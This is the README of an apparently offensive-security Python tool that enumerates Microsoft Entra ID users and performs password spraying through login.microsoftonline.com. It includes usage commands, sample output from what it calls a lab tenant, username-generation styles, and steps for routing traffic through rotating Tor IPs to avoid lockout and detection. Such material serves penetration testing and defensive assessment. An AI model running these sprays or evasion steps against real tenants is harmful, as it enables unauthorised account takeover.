# Entra-Spray
Python tool that allows you to perform Password Spray and User Enumeration tests against Entra ID, with Microsoft login service (login.microsoftonline.com).

The tool recreates the real Microsoft login flow to check:
1. Whether a user exists in Entra ID
2. Whether the password is correct
3. Whether there is a reference to a Federated server

## Main capabilities:
-  Argument (-Check) for checking if user identity exsit in Tenant (after muliple requests it might be False Positive)
-  Argument (-ProxyTor) for route all traffic vit TOR (renew ip after every 4 min..) - This feature comes to solve the problem of False Positive
   Settings adjustment required before using this argument
- Argument (-firstname) and (-lastname) and (-tenantname) for make combination from employee's name until finding the vaild user

### Install:

```bash
pip install httpx
pip install httpx[http2]
pip install httpx[socks]
pip install stem
```

```python
Entra-Spray.py [-h] -user username@doamin.com | path-to-usernames-file -pass password | path-to-passwords-file  [-check] [-ProxyTor] # authentication to Microsoft
Entra-Spray.py [-h] -user username@doamin.com | path-to-usernames-file  [-check] [-ProxyTor] # Just for user validation
Entra-Spray.py [-h] -firstname Shaked -lastname Wiessman -tenantname Shak.com [-ProxyTor] # for Finding the vaild combination
```

Using UserName-Combain.py:
```python
UserName-Combain.py -input names.txt -output username.txt -tenantname @shak.com -style firstl | first | last | firstlast | first.last | last.first | lastfirst | firstL | lastF | firstL2 | firstL3 | lastF2 | lastF3 | fl | lf | l.first | f.last | first.l | last.f | all 
```

### Usage:

the tenant and the upns is a part of a LAB enviroment in Entra ID :]

#### Chekcing id User Exisy by First Name and Last Name:

```python
(Entra-Spray) root@Machine# python3 Entra-Spray.py -firstname shaked -lastname wiessman -tenantname entraspraytenant.onmicrosoft.com

[✗] Username: s.wiessman@entraspraytenant.onmicrosoft.com is not exists
[✗] Username: shaked@entraspraytenant.onmicrosoft.com is not exists
[✗] Username: shaked.w@entraspraytenant.onmicrosoft.com is not exists
[✗] Username: shaked.wiessman@entraspraytenant.onmicrosoft.com is not exists
[✗] Username: shakedw@entraspraytenant.onmicrosoft.com is not exists
[✗] Username: shakedwi@entraspraytenant.onmicrosoft.com is not exists
[✗] Username: shakedwie@entraspraytenant.onmicrosoft.com is not exists
[✓] Username: shakedwiessman@entraspraytenant.onmicrosoft.com is exists
```

#### Checking If User Exist:
```python
(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -check

[✓] Username: shoshi@entraspraytenant.onmicrosoft.com is exists
[✓] Username: david@entraspraytenant.onmicrosoft.comis exists
[✗] Username: dan@entraspraytenant.onmicrosoft.com not exists
[✓] Username: normuser@entraspraytenant.onmicrosoft.com is exists
[✓] Username: shakedwiessman@entraspraytenant.onmicrosoft.com is exists


----------------------------
 Valid users and successful authentications written to valid-users.txt
```

#### Checking If User Exist with TOR routing (-proxytor flag):
```python
(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -check -proxytor

[i] Current TOR IP: {"IsTor":true,"IP":"109.228.160.190"}    <--
[✓] Username: shoshi@entraspraytenant.onmicrosoft.com is exists
[✓] Username: david@entraspraytenant.onmicrosoft.com is exists
[✗] Username: dan@mentraspraytenant.onmicrosoft.com not exists
[✓] Username: normuser@entraspraytenant.onmicrosoft.com is exists
[✓] Username: shakedwiessman@entraspraytenant.onmicrosoft.com is exists

----------------------------
 Valid users and successful authentications written to valid-users.txt
```

#### Preforming Password Spray Attack:
```python
(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456'

[-] Failed to authenticate with shoshi@entraspraytenant.onmicrosoft.com with password Aa123456, didn't check if user exists
[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured   <--
[-] Failed to authenticate with normuser@entraspraytenant.onmicrosoft.com with password Aa123456, didn't check if user exists
[-] Failed to authenticate with shakedwiessman@entraspraytenant.onmicrosoft.com with password Aa123456, didn't check if user exists

----------------------------
 Valid users and successful authentications written to valid-users.txt
```

#### Preforming Password Spray Attack with '-check' flag:
```python
(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check

[!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured   <--
[!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
[!] NOT-success: shakedwiessman@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456

----------------------------
 Valid users and successful authentications written to valid-users.txt
```

#### Preforming Password Spray Attack with '-check' flag and with TOR routing:
The script will check if:
- The user is required to have MFA but has not yet set it up
- The user is required to have MFA
- The user is required to change their password
  
```python
(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check -proxytor

[i] Current TOR IP: {"IsTor":true,"IP":"109.228.160.190"}   <--
[!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured   <--
[!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
[!] NOT-success: shakedwiessman@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456

----------------------------
 Valid users and successful authentications written to valid-users.txt
```

```python
(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -password 'Bb123456' -check -proxytor

[i] Current TOR IP: {"IsTor":true,"IP":"110.22.66.190"}   <--
[!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Bb123456
[!] NOT-success: david@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Bb123456
[!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Bb123456
[✓] User shakedwiessman@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Bb123456, MFA required   <--

----------------------------
 Valid users and successful authentications written to valid-users.txt
```

```python
(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -password 'Cc123456' -check -proxytor

[i] Current TOR IP: {"IsTor":true,"IP":"109.172.188.113"}   <--
[✓] User shoshi@entraspraytenant.onmicrosoft.com is exist, and Password needs updating: Cc123456   <--
[!] NOT-success: david@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Cc123456
[!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Cc123456
[!] NOT-success: shakedwiessman@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Cc123456

----------------------------
 Valid users and successful authentications written to valid-users.txt
```

### Usage UserName-Combain.py:
```bash
(Entra-Spray) root@Machine# cat names.txt

shaked wiessman
israel israeli
ran danker
dani kushmaro
idan amedi
```
```python3
(Entra-Spray) root@Machine# python3 UserName-Combain.py -input names.txt -output usernames.txt -tenant '@entraspraytenant.onmicrosoft.com' -style firstlast

shakedwiessman@entraspraytenant.onmicrosoft.com
israelisraeli@entraspraytenant.onmicrosoft.com
randanker@entraspraytenant.onmicrosoft.com
danikushmaro@entraspraytenant.onmicrosoft.com
idanamedi@entraspraytenant.onmicrosoft.com
```

## Usage with TOR:

### Install:

```bash
sudo apt update
sudo apt install torsocks -y
sudo apt install libtorsocks0 -y
```


1) Start TOR:

  ```bash
  sudo systemctl start tor@default
  ```

2) open /etc/tor/torrc file and add:

  ```bash
  ControlPort 9051
  CookieAuthentication 1
  ```

3) Create symlink:

  ```bash
  sudo ln -s /usr/lib/x86_64-linux-gnu/torsocks/libtorsocks.so /usr/lib/x86_64-linux-gnu/libtorsocks.so
  ```

4) Restart TOR:

  ```bash
  sudo systemctl restart tor@default
  ```

5) Check if TOR is working:
  ```bash
  netstat -tulpen | grep 9050
  torsocks curl https://api.ipify.org
  torsocks curl https://check.torproject.org | grep -i "Congratulations"
  ```

